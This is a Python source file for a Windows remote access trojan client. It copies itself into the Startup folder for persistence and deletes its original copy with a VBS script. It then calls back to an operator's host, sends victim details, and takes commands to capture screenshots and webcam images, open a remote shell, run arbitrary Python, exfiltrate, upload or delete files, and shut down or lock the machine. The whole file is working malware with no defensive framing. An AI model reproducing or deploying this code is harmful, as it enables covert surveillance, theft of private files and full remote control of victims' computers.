import socket, subprocess, os, time, platform, sys, pyscreeze, urllib.request, cv2, shutil
from io import StringIO

# Socket Properties
HOST = ""
PORT = 3000

# Defines (Send & Recv) Functions for use
send = lambda data: objSocket.send(data)
recv = lambda buffer: objSocket.recv(buffer)

# Client Properties
appdata = os.environ["APPDATA"]
username = os.getlogin()
system = platform.system() + " " + platform.release()
filename = __file__.split(".")[0] + ".exe"
Startup_Path = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{filename}"

try:
    Public_IP = urllib.request.urlopen("https://ident.me", timeout=30).read()
except (urllib.error.URLError, Exception):
    Public_IP = b"unknown"

# Copy file to Startup folder
try:
    shutil.copyfile(f"{filename}", Startup_Path)
    with open(appdata+"/configure.vbs", "w") as VBS_File:
        VBS_File.write(f"Set del = CreateObject(\"Scripting.FileSystemObject\")\ndel.DeleteFile(\"{os.getcwd() + '/' + filename}\")")

    os.startfile(Startup_Path); subprocess.Popen(appdata+"/configure.vbs", shell=True)
    sys.exit(0)

except (FileNotFoundError, Exception):
    pass

# Socket Connect Function
def main():
    global objSocket

    while (True):
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except (socket.error, Exception):
            time.sleep(4)
        else:
            break

    send(objSocket.getsockname()[0].encode() + b" " + socket.gethostname().encode() + b" " + username.encode() + \
         b" " + system.encode() + b" " + Public_IP)

main()

def recvall(buffer):
    data = b""
    while (len(data) < buffer):
        data += recv(buffer)
    return data

def ClearFiles():
    if (os.path.isfile(appdata+"/msg.vbs")):
        os.remove(appdata+"/msg.vbs")
    else: pass

    if (os.path.isfile(appdata+"/screenshot.png")):
        os.remove(appdata+"/screenshot.png")
    else: pass

    if (os.path.isfile(appdata+"/webcam.png")):
        os.remove(appdata+"/webcam.png")
    else: pass

    if (os.path.isfile(appdata+"/configure.vbs")):
        os.remove(appdata+"/configure.vbs")
    else: pass

def MessageBox(message):
    with open(appdata+"/msg.vbs", "w") as VBS_MsgBox:
        VBS_MsgBox.write(f"MsgBox \"{message}\", 64, \"[Message]\""); VBS_MsgBox.close()

    subprocess.Popen(appdata+"/msg.vbs", shell=True)
    send(b"(Message Sent)")

def OpenWebpage(url):
    if (url == "append-connection"):
        return

    subprocess.Popen("start " + url, shell=True); send(b"(Webpage Opened)")

def Screenshot():
    try:
        pyscreeze.screenshot(appdata+"/screenshot.png"); send(b"success"); time.sleep(0.2); send(str(os.path.getsize(appdata+"/screenshot.png")).encode())
        with open(appdata+"/screenshot.png", "rb") as ImageFile:
            send(ImageFile.read())
    except:
        send(b"error")

def Webcam():
    try:
        webcam = cv2.VideoCapture(0)
        return_value, image = webcam.read()
        cv2.imwrite(appdata+"/webcam.png", image)
        del(webcam); send(b"success")

        try:
            result = subprocess.check_output(["powershell.exe", "Get-WmiObject Win32_PNPEntity | Select Name | Select-String 'Camera'"], shell=True, timeout=8)
            Webcam_Name = result.split(b"Name=")[1].split(b"}")[0].decode()
        except:
            Webcam_Name = "Not Found"

        send(str(os.path.getsize(appdata+"/webcam.png")).encode()); time.sleep(0.2); send(Webcam_Name.encode()); time.sleep(0.2)
        with open(appdata+"/webcam.png", "rb") as ImageFile:
            send(ImageFile.read())

    except (cv2.error, Exception):
        send(b"error")

def StartProcess(process):
    if not (os.path.isfile(process)):
        send(b"INVALID")
        return

    send(b"VALID"); subprocess.Popen(process, shell=True)

def PythonInterpreter():
    ServerCode = recv(1024).decode()
    if (ServerCode == "not-sending"):
        return

    Redirected_Output = sys.stdout = StringIO()

    try:
        exec(ServerCode); send("SUCCESS".encode()); send(Redirected_Output.getvalue().encode())
    except SyntaxError as se:
        send(f"Syntax Error: ({se})".encode())
    except NameError as ne:
        send(f"Name Error: ({ne})".encode())
    except TypeError as te:
        send(f"Type Error: ({te})".encode())
    except OSError as oe:
        send(f"OS Error: ({oe})".encode())
    except OverflowError as ofe:
        send(f"Overflow Error: ({ofe})".encode())
    except Exception as e:
        send(f"Error: ({e})".encode())
    else:
        send(b"<No Output>")

def RemoteCMD():
    CurrentDirectory = os.getcwd()
    send(CurrentDirectory.encode())

    while (True):
        ServerInput = recv(1024).decode()
        if (ServerInput == "close-cmd"):
            break

        elif (len(ServerInput) > 0):
            CMD_Command = subprocess.Popen(ServerInput, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            CMD_Output = CMD_Command.stdout.read() + CMD_Command.stderr.read()
            OutputData = (CMD_Output + b"\n")
        else:
            OutputData = b"Error Occured"

        send(OutputData)

def ViewFiles():
    drives = [chr(x) + ":/" for x in range(65,91) if os.path.isdir(chr(x) + ":/")]
    send(" ".join(drives).encode())

    directory = recv(1024).decode()
    if not (os.path.isdir(directory)):
        send(b"INVALID")
        return

    Number_Of_Files = str(len(os.listdir(directory)))
    buffersize = str(len("\n".join(os.listdir(directory))))
    files = "\n".join(os.listdir(directory))

    send(b"VALID"); send(Number_Of_Files.encode()); time.sleep(0.2); send(buffersize.encode())
    time.sleep(0.2); send(files.encode())

def SendFile(filepath):
    if not (os.path.isfile(filepath)):
        send(b"error"); return

    send(b"success"); time.sleep(0.2); send(os.path.basename(filepath).encode()); time.sleep(0.2); send(str(os.path.getsize(filepath)).encode())
    with open(filepath, "rb") as file:
        send(file.read())

def ReceiveFile(filename, buffersize):
    with open(appdata+"/"+filename, "wb") as file:
        file.write(recvall(buffersize))

    send(b"(File Sent)")

def Delete():
    ServerInput = recv(1024).decode()
    if (ServerInput == "del-file"):
        file = recv(1024).decode()

        if (os.path.isfile(file)):
            send(b"success"); os.remove(file)
        else:
            send(b"error")

    elif (ServerInput == "del-dir"):
        directory = recv(1024).decode()
        if (os.path.isdir(directory)):
            send(b"success"); shutil.rmtree(directory, ignore_errors=True)
        else:
            send(b"error")

    elif (ServerInput == "error"):
        return

while (True):
    try:
        ServerCommand = recv(1024).decode()
        if (ServerCommand == "close-connection"):
            ClearFiles(); objSocket.close(); del(objSocket); break
        elif (ServerCommand == "append-connection"):
            ClearFiles(); objSocket.close(); del(objSocket); main()
        elif (ServerCommand == "test"):
            continue
        elif (ServerCommand == "message-box"):
            MessageBox(recv(4096).decode())
        elif (ServerCommand == "open-webpage"):
            OpenWebpage(recv(1024).decode())
        elif (ServerCommand == "capture-screenshot"):
            Screenshot()
        elif (ServerCommand == "capture-webcam"):
            Webcam()
        elif (ServerCommand == "start-process"):
            StartProcess(recv(1024).decode())
        elif (ServerCommand == "python-interpreter"):
            PythonInterpreter()
        elif (ServerCommand == "remote-cmd"):
            RemoteCMD()
        elif (ServerCommand == "shutdown-pc"):
            send(b"Powering Off"); subprocess.Popen("shutdown /p", shell=True)
        elif (ServerCommand == "restart-pc"):
            send(b"Computer Restarting"); subprocess.Popen("shutdown /r", shell=True)
        elif (ServerCommand == "lock-pc"):
            send(b"Computer Locked"); subprocess.Popen("rundll32.exe user32.dll,LockWorkStation", shell=True)
        elif (ServerCommand == "current-dir"):
            send(os.getcwd().encode());
        elif (ServerCommand == "view-files"):
            ViewFiles()
        elif (ServerCommand == "receive-file"):
            SendFile(filepath=recv(1024).decode())
        elif (ServerCommand == "send-file"):
            ReceiveFile(filename=recv(1024).decode(), buffersize=int(recv(1024).decode()))
        elif (ServerCommand == "delete"):
            Delete()

    except (socket.error, Exception):
        objSocket.close(); del(objSocket); main()
